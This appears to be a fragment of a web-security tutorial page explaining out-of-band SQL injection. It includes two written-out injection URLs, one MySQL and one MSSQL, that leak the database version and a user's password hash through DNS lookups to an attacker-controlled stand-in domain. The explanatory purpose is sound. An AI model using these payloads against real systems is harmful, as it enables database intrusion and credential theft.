</head><body>Out of Band<br/>
Sometimes the only way an attacker can retrieve information from a database is to use out-of-band techniques. Usually these type of attacks involve sending the data directly from the database server to a machine that is controlled by the attacker. Attackers may use this method if an injection does not occur directly after supplied data is inserted, but at a later point in time.<br/>
<br/>
Out-of-Band Example<br/>
<br/>
https://example.com/index.php?id=1+AND+(SELECT+LOAD_FILE(concat('\\\\',(SELECT @@version),'example.com\\')))<br/>
<br/>
https://www.example.com/index.php?query=declare @pass nvarchar(100);SELECT @pass=(SELECT TOP 1 password_hash FROM users);exec('xp_fileexist ''\\' + @pass + '.example.com\c$\boot.ini''')<br/>
<br/>
In these requests, the target makes a DNS request to the attacker-owned domain, with the query result inside the sub domain. This means that an attacker does not need to see the result of the injection, but can wait until the database server sends a request instead.<br/>
